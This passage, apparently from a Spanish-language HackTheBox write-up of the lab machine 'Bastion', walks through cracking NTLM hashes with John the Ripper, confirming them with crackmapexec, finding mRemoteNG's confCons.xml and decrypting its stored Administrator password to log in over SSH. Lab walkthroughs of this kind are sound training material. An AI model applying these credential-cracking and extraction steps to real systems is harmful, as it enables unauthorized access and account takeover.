+<p>Estuve probando con <strong>evil-winrm</strong>, <strong>psexec</strong>, <strong>wmiexec</strong> y <strong>crackmapexec</strong> con los hashes para hacer <em>PassTheHash</em>, pero no tuve éxito, así que solo nos queda intentar crackearlos, usando <a href="https://www.redeszone.net/seguridad-informatica/john-the-ripper-crackear-contrasenas/">John The Ripper</a> logramos esto, debemos pasarle unos parámetros:</p>
+
+<pre><code class="language-bash">❱ john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT ntlm.hashes
+</code></pre>
+
+<ul>
+  <li><code>--wordlist</code>: El archivo con el que queremos que itere cada hash en busca de similitudes.</li>
+  <li><code>--format</code>: El formato en el que están los hashes, en nuestro caso <strong>NTLM</strong> (o <strong>NT</strong> para <em>john</em>).</li>
+</ul>
+
+<p>Tenemos:</p>
+
+<pre><code class="language-bash">❱ john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT ntlm.hashes
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+                 (Administrator)
+bureaulampje     (L4mpje)
+2g 0:00:00:02 DONE (2021-06-03 00:30) 0.8849g/s 4157Kp/s 4157Kc/s 4159KC/s burg772v..burdy1   
+Warning: passwords printed above might not be all those cracked
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+
+<pre><code class="language-bash">❱ john --show --format=NT ntlm.hashes 
+Administrator:
+Guest:
+L4mpje:bureaulampje
+
+3 password hashes cracked, 0 left
+</code></pre>
+
+<p>De los 3 usuarios encontró el resultado del hash de <strong>L4mpje</strong>, el cual da como contraseña a <strong>bureaulampje</strong> ✨</p>
+
+<p>Despues de algo de tiempo muerto jugando con las herramientas que use para el <em>PassTheHash</em> no conseguí hacer funcionar las credenciales, pero con <strong>crackmapexec</strong> pude confirmar que si son válidas:</p>
+
+<pre><code class="language-bash">❱ crackmapexec smb 10.10.10.134 -u 'L4mpje' -p 'pwincorrecta?'
+SMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
+SMB         10.10.10.134    445    BASTION          [-] Bastion\L4mpje:pwincorrecta? STATUS_LOGON_FAILURE
+</code></pre>
+
+<pre><code class="language-bash">❱ crackmapexec smb 10.10.10.134 -u 'L4mpje' -p 'bureaulampje'
+SMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
+SMB         10.10.10.134    445    BASTION          [+] Bastion\L4mpje:bureaulampje
+</code></pre>
+
+<p>¿Se ve la diferencia? e.e</p>
+
+<p>Al no saber donde más probar las credenciales, echamos un ojo al escaneo de <strong>nmap</strong> que hicimos y pues sí, había algo que no habíamos probado, el puerto <strong>22</strong> (SSH), validemos si por ahí las credenciales nos permiten entrar: (Pues como casi nunca está en una máquina <strong>Windows</strong> pues ni me acordaba de él :P)</p>
+
+<pre><code class="language-bash">❱ ssh L4mpje@10.10.10.134
+L4mpje@10.10.10.134's password: 
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186bash_ssh_lampjeSH.png" alt="186bash_ssh_lampjeSH" /></p>
+
+<p>BOOOM! Tamos dentro del sistema como el usuario <strong>L4mpje</strong> :o</p>
+
+<p>…</p>
+
+<p>Acá ya podemos borrar las monturas, ya que no nos van a ser de utilidad (espero que no :P)</p>
+
+<pre><code class="language-bash">❱ umount /mnt/vhd
+❱ umount /mnt/Backups
+</code></pre>
+
+<p>Sigamos.</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Despues de un rato profundizando, encontramos un rabbit hole en el directorio <code>C:\Logs</code> (que suena llamativo, pero no hay nada útil 🙃)…</p>
+
+<p>Peeeero, finalmente encontramos algo llamativo y distinto:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files (x86)&gt; dir
+
+    Directory: C:\Program Files (x86)
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        16-7-2016     15:23                Common Files
+d-----        23-2-2019     09:38                Internet Explorer
+d-----        16-7-2016     15:23                Microsoft.NET
+da----        22-2-2019     14:01                mRemoteNG
+d-----        23-2-2019     10:22                Windows Defender
+d-----        23-2-2019     09:38                Windows Mail
+d-----        23-2-2019     10:22                Windows Media Player
+d-----        16-7-2016     15:23                Windows Multimedia Platform   
+d-----        16-7-2016     15:23                Windows NT
+d-----        23-2-2019     10:22                Windows Photo Viewer
+d-----        16-7-2016     15:23                Windows Portable Devices
+d-----        16-7-2016     15:23                WindowsPowerShell
+
+PS C:\Program Files (x86)&gt;
+</code></pre>
+
+<p>Ven algo raro? ¯_(ツ)_/¯</p>
+
+<p>Pues sí, hay un programa llamado <strong>mRemoteNG</strong> que normalmente no viene en los sistemas <strong>Windows</strong>, esto nos da un punto de partida para al menos ver de que se trata:</p>
+
+<blockquote>
+  <p>Este programa te permite administrar, en un mismo programa y con una interfaz muy sencilla y amigable, múltiples conexiones con diferentes protocolos. <a href="https://www.smythsys.es/10961/mremoteng-administrador-de-conexiones-de-codigo-abierto/">¿mRemoteNG?</a>.</p>
+</blockquote>
+
+<p>Tales como:</p>
+
+<blockquote>
+  <p>RDP, VNC, SSH, Telnet, rlogin and other protocols. <a href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/mremote/">mremoteng store passwords</a>.</p>
+</blockquote>
+
+<p>Y si, como se ve en la referencia anterior, encontramos una vulnerabilidad para ese servicio 🤭, ya que administra varios conexiones entre protocolos, pero guarda las credenciales que se usan para esas conexiones ⚠️</p>
+
+<blockquote>
+  <p>It saves the passwords in an encrypted format. <a href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/mremote/">mremoteng store passwords</a>.</p>
+</blockquote>
+
+<p>Investigando <strong>donde</strong> las guarda, encontramos el módulo de <strong>metasploit</strong> al que se hace referencia y dentro el archivo con el que juega para extraer las credenciales:</p>
+
+<ul>
+  <li><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/mremote.rb">metasploit-framework/mremote.rb</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186google_mremoteNG_rb.png" alt="186google_mremoteNG_rb" /></p>
+
+<p>Tenemos dos rutas para probar y buscar el archivo llamado <code>confCons.xml</code> o hacer una <a href="https://stackoverflow.com/questions/8677628/recursive-file-search-using-powershell">búsqueda recursiva</a> sobre todo el directorio <code>C:\Users</code> y ver si encuentra el objeto, hagamos esa opción:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files (x86)&gt; Get-Childitem -Path C:\Users\ -Filter confCons.xml -recurse -ErrorAction SilentlyContinue -Force  
+
+    Directory: C:\Users\L4mpje\AppData\Roaming\mRemoteNG
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        22-2-2019     14:03           6316 confCons.xml
+
+PS C:\Program Files (x86)&gt;
+</code></pre>
+
+<p>Le indicamos que busque en el directorio <code>C:\Users</code> y que filtre por un archivo llamado <code>confCons.xml</code>, que lo haga recursivamente (en todos los directorios) y fuerce a buscar archivos ocultos yyyy que si encuentra algún error lo salte y siga buscando.</p>
+
+<p>Y lo encontramos 🔥 lo tenemos en la ruta:</p>
+
+<pre><code class="language-powershell">C:\Users\L4mpje\AppData\Roaming\mRemoteNG
+</code></pre>
+
+<p>Veamos si es cierto 😬</p>
+
+<pre><code class="language-powershell">PS C:\Program Files (x86)&gt; ls C:\Users\L4mpje\AppData\Roaming\mRemoteNG
+
+    Directory: C:\Users\L4mpje\AppData\Roaming\mRemoteNG
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+...
+-a----        22-2-2019     14:03           6316 confCons.xml
+...
+
+PS C:\Program Files (x86)&gt;
+</code></pre>
+
+<p>Y si, pues viendo su contenido encontramos las contraseñas de las que se hablaban:</p>
+
+<pre><code class="language-powershell">PS C:\Program Files (x86)&gt; type C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml
+</code></pre>
+
+<p>Vemos unas credenciales del usuario <strong>Administrator</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186win_confConsXML_1.png" alt="186win_confConsXML_1" /></p>
+
+<p>Y otras del usuario <strong>L4mpje</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186win_confConsXML_2.png" alt="186win_confConsXML_2" /></p>
+
+<p>Pero, están encriptadas, como las desencriptamos ❓</p>
+
+<p>Con una simple búsqueda de <code>decrypt mremoteng</code> en la web, obtenemos este recurso que se encarga de esa tarea:</p>
+
+<ul>
+  <li><a href="https://github.com/haseebT/mRemoteNG-Decrypt">https://github.com/haseebT/mRemoteNG-Decrypt</a>.</li>
+</ul>
+
+<p>Lo clonamos y simplemente debemos pasarle la contraseña encriptada, probemos con la del usuario <strong>Administrator</strong> primero y despues con la de <strong>L4mpje</strong>:</p>
+
+<pre><code class="language-bash">❱ python3 mRemoteNG-Decrypt/mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="   
+Password: thXLHM96BeKL0ER2
+</code></pre>
+
+<pre><code class="language-bash">❱ python3 mRemoteNG-Decrypt/mremoteng_decrypt.py -s "yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB"   
+Password: bureaulampje
+</code></pre>
+
+<p>(Es la misma con la que ingresamos por medio de <strong>SSH</strong>).</p>
+
+<p>Perfecto, pues probemos esa contraseña del usuario <strong>Administrator</strong> contra el servicio <strong>SSH</strong>:</p>
+
+<pre><code class="language-bash">❱ ssh Administrator@10.10.10.134
+Administrator@10.10.10.134's password:   
+</code></pre>
+
+<p>Colocamos la contraseña y obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186bash_ssh_adminSH.png" alt="186bash_ssh_adminSH" /></p>
+
+<p>LISSSSSSSSSSTO, tamos dentroooooooooooo 🚀</p>
+
+<p>Veamos las flags…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastion/186flags.png" alt="186flags" /></p>
+
+<p>…</p>
+
+<p>Bonita máquina, bastante juguetona y de enumerar bien, me gusto el tema de las monturas y el tener que jugar con un backup de una máquina virtual, lindo eso…</p>
+
+<p>Bueno bueno, hasta acá hemos llegado, y que el camino los guie hacia la guía del camino :P COMO SIEMPRE!! A romper todo!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Bastion&url=http://localhost:4000/htb/bastion" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SMB">SMB</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#VHD">VHD</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#backup">backup</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#cracking">cracking</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#mRemoteNG">mRemoteNG</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#mount">mount</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#registry-files">registry-files</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/curling">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160banner.png" alt="HackTheBox - Curling"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/curling">HackTheBox - Curling</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil. Ojos bien abiertos en la página web, jueguitos con templates de Joomla, loops de backups (?), movimientos sensuales con un archivo de configuración de cURL y...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">21 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/atom">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/atom/340banner.png" alt="HackTheBox - Atom"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/atom">HackTheBox - Atom</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio. Jugaremos con SMB, recrearemos actualizaciones (feature de electron) en binarios para que sean ejecutados por un equipo de QA y encontraremos la relación amorosa entre Redis...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">10 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/heist">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201banner.png" alt="HackTheBox - Heist"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/heist">HackTheBox - Heist</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil, jugaremos con crackeo de passwords Cisco, movimientos laterales para encontrar usuarios a los cuales no teníamos acceso yyyyyy dumpearemos procesos de Firefox para ver que está...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">15 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
